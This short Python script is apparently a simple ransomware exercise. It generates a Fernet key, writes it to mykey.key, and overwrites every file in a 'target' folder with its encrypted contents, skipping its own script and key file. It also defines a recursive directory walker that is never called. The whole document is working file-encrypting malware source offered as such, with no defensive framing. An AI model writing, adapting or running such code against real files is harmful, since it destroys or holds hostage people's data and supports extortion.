#!/usr/bin/env python3
import os
from cryptography.fernet import Fernet

#현재 디렉토리 위치
working_dir = os.path.dirname(os.path.realpath(__file__)) 

files = []

def fileEncrypt(dir_name):
    file_lst = os.listdir(dir_name)
    for filename in file_lst:
        if filename == 'ransomeware.py' or filename == 'mykey.key':
            continue
        full_filename = os.path.join(dir_name,filename)
        if os.path.isdir(full_filename):
            fileEncrypt(full_filename)
        else:
            files.append(full_filename)

key = Fernet.generate_key()

with open('mykey.key', 'wb') as mykey:
    mykey.write(key)

files = os.listdir('target')

for file in files:
    with open('./target/'+file,'rb') as thefile:
        contents = thefile.read()
    contents_encrypted = Fernet(key).encrypt(contents)
    with open('./target/'+file, 'wb') as thefile:
        thefile.write(contents_encrypted)
